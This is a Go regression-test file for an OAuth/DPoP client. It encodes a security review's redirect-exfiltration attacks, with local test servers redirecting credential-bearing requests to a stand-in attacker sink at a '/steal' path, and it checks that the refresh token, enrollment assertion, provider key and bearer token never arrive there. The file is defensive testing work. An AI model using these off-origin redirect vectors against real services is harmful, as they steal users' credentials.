package auth

// The independent review's redirect-exfil vectors, converted into regression
// tests and run against the high-level methods.
//
// PROVENANCE. These are the reviewers' encoding of the attacks, handed over
// from the dropin review (angles a1/a2) as five files in handover-proxy/
// internal_auth. credentialclient_test.go proves the POLICY at the
// constructor; these prove the CALL PATHS — that Refresh, the assertion
// redemption and RegisterProviderCredential are actually wired through it, so
// a future method that builds its own client is caught by something other
// than the source-parsing test.
//
// WHAT HAD TO CHANGE, AND WHY IT IS NOT A DETAIL. Five of the seven handed-
// over tests fail against FIXED code, because they were written to demonstrate
// a vulnerability in an unfixed tree rather than to guard a fixed one. Their
// shape is "reach the attacker, then inspect what arrived", so they open with
// `t.Fatal("attacker origin was never contacted")` — which is precisely the
// outcome the fix produces. One of them (the same-host-different-port case)
// had no failing assertion at all: both branches were t.Log, so it could
// never go red.
//
// So the conversion inverts the guard: not contacted is the PASS, and the
// body inspection stays underneath it as defense in depth, because "the
// request was refused" and "the secret did not travel" are different claims
// and the second is the one that matters if the first ever regresses.
//
// The two that were already polarized correctly — the provider-key and
// enrollment-assertion legs — keep their original names, so a reader can
// cross-reference the review directly. The rest are renamed to state the
// guarantee, since a green test called ...LeaksToken misleads.
//
// The bearer pair also drove a BARE &http.Client{Transport: dpopTransport},
// which characterizes net/http rather than this package: it would have stayed
// green whatever this repository did. Rewired through newCredentialClient.

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
)

// reviewSink is a foreign origin that must never be reached. It records
// whatever arrives so a regression reports the secret, not just the fact.
type reviewSink struct {
	srv *httptest.Server

	hits atomic.Int64
	mu   sync.Mutex
	body string
	auth string
}

func newReviewSink(t *testing.T, reply string) *reviewSink {
	t.Helper()
	s := &reviewSink{}
	s.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(io.LimitReader(r.Body, 1<<16))
		s.hits.Add(1)
		s.mu.Lock()
		s.body = string(b)
		s.auth = r.Header.Get("Authorization")
		s.mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(reply))
	}))
	t.Cleanup(s.srv.Close)
	return s
}

func (s *reviewSink) seen() (int64, string, string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.hits.Load(), s.body, s.auth
}

// refuse asserts the whole guarantee: the foreign origin was never contacted,
// and — underneath that — the secret is in nothing it received.
func (s *reviewSink) refuse(t *testing.T, secret, what string) {
	t.Helper()
	hits, body, auth := s.seen()
	if hits != 0 {
		t.Errorf("%s: the foreign origin was contacted %d time(s); a credential-bearing "+
			"request must not follow a redirect off its origin", what, hits)
	}
	if secret != "" && (strings.Contains(body, secret) || strings.Contains(auth, secret)) {
		t.Errorf("%s LEAKED to %s\n  body: %q\n  Authorization: %q",
			what, s.srv.URL, body, auth)
	}
}

// reviewAS is an honest discovery/metadata surface whose named path redirects
// off-origin — an open redirect, a compromised edge, or an injected hop.
func newReviewAS(t *testing.T, redirectFrom func(path string) bool, to string, code int) *httptest.Server {
	t.Helper()
	var as *httptest.Server
	as = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case redirectFrom(r.URL.Path):
			http.Redirect(w, r, to, code)
		case r.URL.Path == "/oauth/token":
			// Must actually mint a token: authedRequest refreshes BEFORE it
			// makes the call under test, so an AS that 404s here means the
			// resource request is never attempted and the test passes
			// vacuously. (It did, until this case was added.) Tests that
			// redirect FROM /oauth/token match the case above and never
			// reach here.
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write([]byte(tokenJSON("at-1", "rt-1")))
		case r.URL.Path == WellKnownPath:
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write(fixtureDocument(t, as.URL))
		case r.URL.Path == "/.well-known/oauth-authorization-server":
			_ = json.NewEncoder(w).Encode(map[string]any{
				"issuer": as.URL, "authorization_endpoint": as.URL + "/oauth/authorize",
				"token_endpoint":                as.URL + "/oauth/token",
				"device_authorization_endpoint": as.URL + "/oauth/device_authorization",
				"revocation_endpoint":           as.URL + "/oauth/revoke",
				"jwks_uri":                      as.URL + "/oauth/jwks.json",
				"grant_types_supported":         []string{"refresh_token", GrantTypeJWTBearer},
			})
		default:
			http.NotFound(w, r)
		}
	}))
	t.Cleanup(as.Close)
	return as
}

func reviewClients(t *testing.T, asURL, refresh string) (*OAuthClient, *MiningClient) {
	t.Helper()
	store, err := OpenStore(filepath.Join(t.TempDir(), "state"))
	if err != nil {
		t.Fatal(err)
	}
	if refresh != "" {
		if err := store.SaveRefreshToken(refresh); err != nil {
			t.Fatal(err)
		}
	}
	d, err := NewDiscoverer(DiscoveryConfig{BaseURL: asURL, ChainID: "twilight-1", SlotID: 7})
	if err != nil {
		t.Fatal(err)
	}
	oc, err := NewOAuthClient(context.Background(), d, store)
	if err != nil {
		t.Fatal(err)
	}
	return oc, NewMiningClient(d, oc, store)
}

// --- the legs, one per credential ---

// The refresh token is the worst thing this proxy holds: it is the
// installation's whole authorization, and a 307 replays it in the POST body.
//
// Renamed from the review's TestRefreshFollowsOffOriginRedirectAndLeaksToken,
// which asserted the defect — it opened by failing when the sink was NOT
// reached, which is what a fixed client does.
func TestRefreshDoesNotFollowAnOffOriginRedirect(t *testing.T) {
	const secret = "SECRET-REFRESH-TOKEN"

	sink := newReviewSink(t, `{"access_token":"attacker-issued","token_type":"DPoP","expires_in":900,"refresh_token":"x"}`)
	as := newReviewAS(t, func(p string) bool { return p == "/oauth/token" },
		sink.srv.URL+"/steal", http.StatusTemporaryRedirect)

	oc, _ := reviewClients(t, as.URL, secret)
	if _, err := oc.Refresh(context.Background()); err == nil {
		t.Error("Refresh succeeded through an off-origin redirect")
	}
	sink.refuse(t, secret, "the refresh token")
}

// The enrollment assertion, redeemed under RFC 7523. Keeps the review's name:
// its polarity was already right.
func TestAssertionRedemptionLeaksAssertionOnOffOriginRedirect(t *testing.T) {
	const secret = "eyJhbGciOiJFZERTQSJ9.ASSERTION-SECRET.sig" // #nosec G101 -- synthetic canary, present so a leak can be searched for

	sink := newReviewSink(t, `{"access_token":"a","refresh_token":"b","token_type":"DPoP","expires_in":600}`)
	as := newReviewAS(t, func(p string) bool { return p == "/oauth/token" },
		sink.srv.URL+"/steal", http.StatusTemporaryRedirect)

	oc, _ := reviewClients(t, as.URL, "")
	if _, err := oc.RedeemEnrollmentAssertion(context.Background(), secret); err == nil {
		t.Error("the assertion was redeemed through an off-origin redirect")
	}
	sink.refuse(t, secret, "the enrollment assertion")
}

// §36: the zero-spend verification key goes to the configured AS and nowhere
// else. RegisterProviderCredential PUTs it in the body through authedRequest,
// and a 308 replays that body. Keeps the review's name.
func TestProviderKeyLeaksOnOffOriginRedirect(t *testing.T) {
	const secret = "sk-or-v1-ZERO-SPEND-SECRET" // #nosec G101 -- synthetic canary, present so a leak can be searched for

	sink := newReviewSink(t, `{"provider":"openrouter","status":"READY","key_fingerprint":"fp"}`)
	as := newReviewAS(t, func(p string) bool {
		return strings.HasPrefix(p, "/v1/provider-verification/")
	}, sink.srv.URL+"/steal", http.StatusPermanentRedirect) // 308

	_, m := reviewClients(t, as.URL, "rt-1")
	if _, err := m.RegisterProviderCredential(context.Background(), secret); err == nil {
		t.Error("the provider key was registered through an off-origin redirect")
	}
	sink.refuse(t, secret, "the provider verification key")
}

// --- the bearer cases, rewired through the constructor ---

// bearerProbe drives one authed resource request the way authedRequest does,
// through a client built by newCredentialClient rather than a bare one. The
// review's version used a bare client, so it characterized net/http and would
// have stayed green whatever this package did.
func bearerProbe(t *testing.T, rewrite func(u *url.URL)) *reviewSink {
	t.Helper()
	sink := newReviewSink(t, `{}`)
	as := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		loc, err := url.Parse(sink.srv.URL + "/steal")
		if err != nil {
			t.Error(err)
			return
		}
		if rewrite != nil {
			rewrite(loc)
		}
		http.Redirect(w, r, loc.String(), http.StatusTemporaryRedirect)
	}))
	t.Cleanup(as.Close)

	// The store mints the installation key, exactly as production does; the
	// review generated a loose ecdsa key, which works but exercises less.
	store, err := OpenStore(filepath.Join(t.TempDir(), "state"))
	if err != nil {
		t.Fatal(err)
	}
	key, err := store.DPoPKey()
	if err != nil {
		t.Fatal(err)
	}
	proofer, err := NewProofer(key)
	if err != nil {
		t.Fatal(err)
	}
	req, err := http.NewRequestWithContext(context.Background(), http.MethodPost,
		as.URL+"/observations", strings.NewReader(`{"x":1}`))
	if err != nil {
		t.Fatal(err)
	}
	req.Header.Set("Authorization", "DPoP super-secret-access-token")
	req.Header.Set("Content-Type", "application/json")

	resp, err := newCredentialClient(newDPoPTransport(proofer)).Do(req)
	if err == nil {
		drainAndClose(resp.Body)
		t.Error("the off-origin redirect was followed")
	}
	return sink
}

// THE HIGH CASE, and the one that motivated keeping this vector.
//
// net/http strips Authorization by HOST, ignoring the port — so on
// 127.0.0.1:P1 → 127.0.0.1:P2 Go copies the header, and a DPoP access token
// or a Participation Capability travels. sameOrigin compares URL.Host, which
// INCLUDES the port, so this is refused. That distinction is invisible at the
// call site: a future "simplify" to compare Hostname() would silently
// reintroduce it, and this test is what would object.
//
// Renamed from the review's TestBearerLeakedToSameHostDifferentPort, which
// asserted nothing — both of its branches were t.Log, so it could never fail.
func TestBearerNotLeakedToSameHostDifferentPort(t *testing.T) {
	sink := bearerProbe(t, nil) // both servers are 127.0.0.1, different ports
	sink.refuse(t, "super-secret-access-token", "the DPoP access token")
}

// The cross-host case. Go would strip Authorization here by itself — this
// test exists to record that the guarantee does NOT rest on that: the request
// must not be made at all, so the body (which Go does NOT strip) cannot
// travel either.
func TestBearerNotLeakedToDifferentHost(t *testing.T) {
	sink := bearerProbe(t, func(u *url.URL) { u.Host = "localhost:" + u.Port() })
	sink.refuse(t, "super-secret-access-token", "the DPoP access token")
}
